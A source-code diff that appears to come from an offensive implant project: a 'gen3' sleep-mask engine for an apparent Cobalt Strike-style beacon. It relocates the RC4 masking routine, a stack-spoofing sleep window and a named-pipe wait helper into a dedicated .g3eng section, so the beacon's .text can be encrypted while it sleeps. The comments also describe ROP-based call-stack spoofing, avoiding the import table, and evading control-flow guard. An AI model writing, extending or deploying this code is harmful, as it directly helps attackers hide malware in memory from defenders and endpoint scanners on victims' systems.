@@ -34,7 +34,17 @@ typedef struct {
 
 #define G3_MAX_BLOCKS 300
 
-static void g3_rc4(G3_SF032 fn, unsigned char * buf, unsigned long len, const unsigned char * key, unsigned int ctr)
+/* 1a': the mask engine lives in its own .g3eng section - the snapshot
+ * excludes THAT span instead of all of .text, so the sleep window can
+ * mask the code section with the engine still executable (same trick as
+ * the official BOF executing outside the image; no private-page copy
+ * needed). Everything that runs between mask and unmask must be in this
+ * section: RC4, the mask/unmask loop (RC4 twice with the same key is the
+ * identity - one callback serves both directions), the window core, and
+ * the pipe-wait body. Callers in .text only run before the first mask
+ * application and after the second. */
+#pragma code_seg(".g3eng")
+__declspec(noinline) static void g3_rc4(G3_SF032 fn, unsigned char * buf, unsigned long len, const unsigned char * key, unsigned int ctr)
 {
 	unsigned char k[16];
 	G3_USTRING d, kk;
@@ -54,6 +64,8 @@ static void g3_rc4(G3_SF032 fn, unsigned char * buf, unsigned long len, const un
 	for (j = 0; j < 16; j++)
 		k[j] = 0;
 }
+
+#pragma code_seg()
 
 static BOOL g3_page_writable(void * p)
 {
@@ -226,13 +238,12 @@ static int g3_snapshot_blocks(G3_BLOCK * out, int max, DWORD * text_span)
 	}
 #endif
 
-	/* The mask engine (this code) lives in beacon .text: an in-place
-	 * encrypt of .text would encrypt our own return path mid-call. The
-	 * official sleepmask BOF survives masking .text only because the BOF
-	 * executes from outside the image; covering .text the same way needs
-	 * this engine copied to a private page (follow-up). Until then .text
-	 * is excluded from the Gen3 range - parse our own PE header for its
-	 * extent (the header page itself is data, still masked). */
+	/* 1a': the engine executes from its own .g3eng section, so the ONLY
+	 * span that must stay out of the mask range is that section - .text
+	 * itself is masked now. Find both .text (reported via text_span for
+	 * the bofwin accessor) and .g3eng (the exclusion span). A build with
+	 * no .g3eng section (should not happen) falls back to excluding
+	 * .text wholesale - fail-open to the pre-1a' behavior. */
 	{
 		unsigned char * pe = (unsigned char *)parms.beacon_ptr;
 		DWORD lfanew = *(DWORD *)(pe + 0x3C);
@@ -241,18 +252,35 @@ static int g3_snapshot_blocks(G3_BLOCK * out, int max, DWORD * text_span)
 		DWORD secoff = lfanew + 24 + optsz;
 		WORD i;
 		sizeimg = *(DWORD *)(pe + lfanew + 24 + 0x38); /* PE32+ SizeOfImage */
+		DWORD real_text_va = 0, real_text_end = 0;
+		DWORD eng_va = 0, eng_end = 0;
 		for (i = 0; i < nsec; i++) {
 			unsigned char * so = pe + secoff + (DWORD)i * 40;
 			if (memcmp(so, ".text", 5) == 0) {
 				DWORD vsz = *(DWORD *)(so + 8);
-				text_va = *(DWORD *)(so + 12);
-				text_end = text_va + (vsz ? vsz : *(DWORD *)(so + 16));
-				if (text_span != NULL) {
-					text_span[0] = text_va;
-					text_span[1] = text_end;
-				}
-				break;
+				DWORD va = *(DWORD *)(so + 12);
+				real_text_va = va;
+				real_text_end = va + (vsz ? vsz : *(DWORD *)(so + 16));
 			}
+			else if (memcmp(so, ".g3eng", 6) == 0) {
+				DWORD vsz = *(DWORD *)(so + 8);
+				eng_va = *(DWORD *)(so + 12);
+				eng_end = eng_va + (vsz ? vsz : *(DWORD *)(so + 16));
+			}
+		}
+		if (text_span != NULL) {
+			text_span[0] = real_text_va;
+			text_span[1] = real_text_end;
+		}
+		if (eng_va != 0) {
+			/* 1a': engine section found - exclude only it; .text is
+			 * masked for real now */
+			text_va = eng_va;
+			text_end = eng_end;
+		}
+		else {
+			text_va = real_text_va;
+			text_end = real_text_end;
 		}
 	}
 
@@ -555,7 +583,14 @@ typedef void (*G3_MASKFN)(void * ctx);
 /* the window: single function so ChildSP is taken in the frame that will
  * actually wait (bisect-C proved this position; taking it in a shallower
  * prepare-frame shifts the overwrite span onto live frames). */
-static BOOL g3_stack_spoof_sleep(DWORD time, G3_MASKFN maskfn, void * ctx)
+#pragma code_seg(".g3eng")
+/* 1a': the whole window core lives in .g3eng - with .text now inside the
+ * mask range, every instruction executed between the first maskfn() and
+ * the second must come from this section or an external DLL (pre-resolved
+ * pointers). The function applies RC4 (mask), waits, tears down through
+ * pre-resolved pointers, then applies RC4 again (unmask) before returning
+ * to .text. */
+__declspec(noinline) static BOOL g3_stack_spoof_sleep(DWORD time, G3_MASKFN maskfn, void * ctx)
 {
 	CONTEXT cap;
 	CONTEXT rop_backup, rop_spoof, rop_restore, rop_event;
@@ -582,6 +617,7 @@ static BOOL g3_stack_spoof_sleep(DWORD time, G3_MASKFN maskfn, void * ctx)
 			return FALSE;
 		maskfn(ctx);
 		psleep(time);
+		maskfn(ctx); /* RC4 twice with the same key = unmask */
 		return TRUE;
 	}
 
@@ -643,6 +679,7 @@ static BOOL g3_stack_spoof_sleep(DWORD time, G3_MASKFN maskfn, void * ctx)
 				return FALSE;
 			maskfn(ctx);
 			psleep(time);
+			maskfn(ctx);
 			return TRUE;
 		}
 	}
@@ -711,18 +748,22 @@ static BOOL g3_stack_spoof_sleep(DWORD time, G3_MASKFN maskfn, void * ctx)
 	ok = TRUE;
 
 done:
-	/* still masked here (gen3_sleep unmasks after we return): every API
-	 * through the pre-resolved pointers above, never the IAT */
+	/* teardown still masked (pre-resolved pointers, never the IAT), then
+	 * the second maskfn() application unmasks every block - the caller
+	 * in .text only ever sees plaintext around this call */
 	if (queue != NULL)
 		pdeletetq(queue, (HANDLE)-1);
 	if (event != NULL)
 		pcloseh(event);
+	maskfn(ctx);
 	return ok;
 }
+#pragma code_seg()
 
 /* ---------------- entry ---------------- */
 
-static void g3_mask_all_cb(void * vctx)
+#pragma code_seg(".g3eng")
+__declspec(noinline) static void g3_mask_all_cb(void * vctx)
 {
 	G3_MASKCTX * m = (G3_MASKCTX *)vctx;
 	/* Everything this loop touches is stack (ctx) or register: fn/key from
@@ -737,6 +778,16 @@ static void g3_mask_all_cb(void * vctx)
 	}
 	g3_log_n(&m->io, 'x', 0, 0, 0);
 }
+
+/* masked blocking-wait helper for the pipe channels: mask, run the wait
+ * body (itself in .g3eng), unmask. No timers - CFG-immune by design. */
+__declspec(noinline) static void g3_mask_wait_unmask(G3_MASKCTX * m, void (*body)(void *), void * wctx)
+{
+	g3_mask_all_cb(m);
+	body(wctx);
+	g3_mask_all_cb(m); /* RC4 twice = unmask */
+}
+#pragma code_seg()
 
 BOOL gen3_sleep(DWORD time)
 {
@@ -756,8 +807,8 @@ BOOL gen3_sleep(DWORD time)
 	g3_log("sleep: enter", 0x7fffffff);
 	/* gparms is initialized lazily by the official BOF path (boff.cpp) or
 	 * the trampoline - both run AFTER gen3 in GargleSleep. Without this
-	 * the snapshot dereferences a NULL gparms. No exclusion span: .text
-	 * is already excluded explicitly in g3_snapshot_blocks. */
+	 * the snapshot dereferences a NULL gparms. The snapshot's exclusion
+	 * span is the .g3eng engine section (1a'), not .text. */
 	if (gparms == NULL)
 		gargle_setup_parms(NULL, NULL, 0);
 	if (!g_inited && !g3_init()) {
@@ -802,22 +853,15 @@ BOOL gen3_sleep(DWORD time)
 	}
 #endif
 
+	/* 1a': the engine (g3_stack_spoof_sleep, .g3eng) masks ALL blocks -
+	 * .text included, only .g3eng excluded - waits, tears down and
+	 * applies RC4 a second time (unmask) before returning here. This
+	 * caller is .text: it runs only with the image fully plaintext. */
 	if (!g3_stack_spoof_sleep(time, g3_mask_all_cb, &mctx)) {
 		g3_log("sleep: window failed -> fallback", 0x7fffffff);
+		/* engine failure paths never masked (all setup failures), or
+		 * masked+unmasked internally (wait paths) - either way plain */
 		return FALSE;
-	}
-	/* still masked here - pointer-ized line only (round 12 fix) */
-	g3_log_n(&mctx.io, 'w', 0, 0, 0);
-
-	/* RC4 twice with the same key restores the plaintext. The fn pointer
-	 * MUST come from the pre-mask cache: reading g_sf032 now would load
-	 * ciphertext (it lives in .data, still masked at this point). The
-	 * per-block 'u'/'U' lines make the round trip auditable: u == m,
-	 * U == C for every block. */
-	for (i = 0; i < nblocks; i++) {
-		g3_log_n(&mctx.io, 'u', (unsigned int)i, g3_chk(blocks[i].ptr, blocks[i].len), 0);
-		g3_rc4(mctx.fn, blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
-		g3_log_n(&mctx.io, 'U', (unsigned int)i, g3_chk(blocks[i].ptr, blocks[i].len), 0);
 	}
 	g3_log_n(&mctx.io, 'D', 0, 0, 0);
 
@@ -847,13 +891,15 @@ typedef struct {
 	DWORD  err;
 } G3_PIPEWAIT;
 
-static void g3_wait_cnp(void * v)
+#pragma code_seg(".g3eng")
+__declspec(noinline) static void g3_wait_cnp(void * v)
 {
 	G3_PIPEWAIT * w = (G3_PIPEWAIT *)v;
 
 	w->r = w->pConnectNamedPipe(w->pipe, NULL);
 	w->err = w->pGetLastError();
 }
+#pragma code_seg()
 
 BOOL gen3_wait_pipe(HANDLE pipe)
 {
@@ -898,13 +944,12 @@ BOOL gen3_wait_pipe(HANDLE pipe)
 	mctx.io = g_io;
 #endif
 
-	/* the window: mask everything, block on the caller's primitive,
-	 * unmask. The callback contract (frame-locals only) is the same one
-	 * the sleep path proved across 2000+ audited windows. */
-	g3_mask_all_cb(&mctx);
-	g3_wait_cnp(&w);
-	for (i = 0; i < nblocks; i++)
-		g3_rc4(mctx.fn, blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
+	/* the window: mask everything (.text included, engine section
+	 * excluded), block on the caller's primitive, unmask - all inside
+	 * the .g3eng wrapper, so this .text caller never runs masked. The
+	 * callback contract (frame-locals only) is the same one the sleep
+	 * path proved across 2000+ audited windows. */
+	g3_mask_wait_unmask(&mctx, g3_wait_cnp, &w);
 
 	for (i = 0; i < 16; i++)
 		key[i] = 0;
@@ -922,8 +967,32 @@ BOOL gen3_wait_pipe(HANDLE pipe)
 int g3_snapshot_for_bofwin(G3_HEADER_BLOCK * out, int max, DWORD * text_span)
 {
 	/* same layout as G3_BLOCK - the accessor exists so callers outside the
-	 * gen3 translation unit can reuse the snapshot without the private type */
-	return g3_snapshot_blocks((G3_BLOCK *)out, max, text_span);
+	 * gen3 translation unit can reuse the snapshot without the private type.
+	 *
+	 * 1a' contract guard: since the gen3 snapshot now MASKS .text (its
+	 * exclusion span is .g3eng, not .text), the raw list contains .text -
+	 * but the bofwin engine appends .text itself as its stub-owned block.
+	 * Filter every block overlapping the .text span back out so the
+	 * consumer sees the pre-1a' shape (non-.text sections + heap only). */
+	G3_BLOCK * raw = (G3_BLOCK *)out;
+	int n = g3_snapshot_blocks(raw, max, text_span);
+	int i, w = 0;
+
+	if (text_span[0] == 0 || text_span[1] <= text_span[0])
+		return n;
+	for (i = 0; i < n; i++) {
+		unsigned char * bp = raw[i].ptr;
+		unsigned long bl = raw[i].len;
+		unsigned char * ts = (unsigned char *)gparms->beacon_ptr + text_span[0];
+		unsigned char * te = (unsigned char *)gparms->beacon_ptr + text_span[1];
+		BOOL inside = (bp >= ts && bp + bl <= te);
+		if (!inside) {
+			raw[w].ptr = bp;
+			raw[w].len = bl;
+			w++;
+		}
+	}
+	return w;
 }
 
 #else /* !_M_X64: x86 gen3-1a REMOVED (round 23) - the slice compiles but the
